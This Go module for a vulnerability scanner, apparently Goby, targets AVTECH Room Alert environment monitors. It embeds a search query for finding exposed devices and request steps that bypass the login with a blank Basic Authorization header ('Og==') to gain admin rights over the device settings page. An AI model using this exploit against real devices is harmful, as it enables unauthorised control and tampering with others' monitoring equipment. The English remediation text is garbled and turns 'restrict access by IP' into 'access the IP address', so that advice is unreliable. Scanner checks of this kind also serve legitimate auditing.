package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "Room Alert Management Page Default Password",
    "Description": "<p>Room Alert Temperature &amp; Environment Monitors Is The Most Advanced, Easy-To-Use, Reliable &amp; Affordable Environment Monitors Available.</p><p>Room Alert Temperature &amp; Environment Monitors' web page uses basic identity authentication to authenticate. You can use a blank password to bypass the login, successfully obtain the management authority of the monitor, and tamper with the device configuration.</p>",
    "Product": "AVTECH-Room Alert",
    "Homepage": "https://avtech.com/Products/Environment_Monitors/",
    "DisclosureDate": "2022-07-11",
    "Author": "by047",
    "FofaQuery": "title=\"Room Alert\" && title=\"AVTECH Software\"",
    "GobyQuery": "title=\"Room Alert\" && title=\"AVTECH Software\"",
    "Level": "1",
    "Impact": "<p>Room Alert Temperature &amp; Environment Monitors' web page uses basic identity authentication to authenticate. You can use a blank password to bypass the login, successfully obtain the management authority of the monitor, and tamper with the device configuration.</p>",
    "Recommendation": "<p>It is recommended to access the IP address of the room alert web page.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/secure/settings.htm",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "401 Unauthorized",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/secure/settings.htm",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic Og=="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AVTECH Software, Inc.",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/secure/settings.htm",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "401 Unauthorized",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/secure/settings.htm",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic Og=="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AVTECH Software, Inc.",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|HTTP请求头 Authorization: Basic Og==||"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Room Alert 管理页面默认口令",
            "Product": "AVTECH-Room Alert",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Room Alert 温度及环境监视器是 AVTECH 公司出品的最先进、易于使用、可靠且价格合理的环境监测器。</span><br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\"><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Room Alert <span style=\"color: rgb(0, 0, 0); font-size: 16px;\">温度及环境监视器 web 页面使用 Basic 基本身份认证进行认证，可以使用空密码进行绕过登录，成功获取监视器的管理权限，可对设备配置进行篡改。</span></span><br></span></p>",
            "Recommendation": "<p>建议限制&nbsp;<span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Room Alert&nbsp; web 页面的访问 IP 地址。</span></p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Room Alert&nbsp;</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">温度及环境监视器 web 页面使用 Basic 基本身份认证进行认证，可以使用空密码进行绕过登录，成功获取监视器的管理权限，可对设备配置进行篡改。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Room Alert Management Page Default Password",
            "Product": "AVTECH-Room Alert",
            "Description": "<p>Room Alert Temperature &amp; Environment Monitors Is&nbsp;The Most Advanced, Easy-To-Use, Reliable &amp; Affordable Environment Monitors Available.<br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Room Alert Temperature &amp; Environment Monitors'</span>&nbsp;web page uses basic identity authentication to authenticate. You can use a blank password to bypass the login, successfully obtain the management authority of the monitor, and tamper with the device configuration.</span><br></p>",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">It is recommended to access the IP address of the room alert web page.</span><br></p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(22, 28, 37);\">Room Alert Temperature &amp; Environment Monitors'</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;web page uses basic identity authentication to authenticate. You can use a blank password to bypass the login, successfully obtain the management authority of the monitor, and tamper with the device configuration.</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
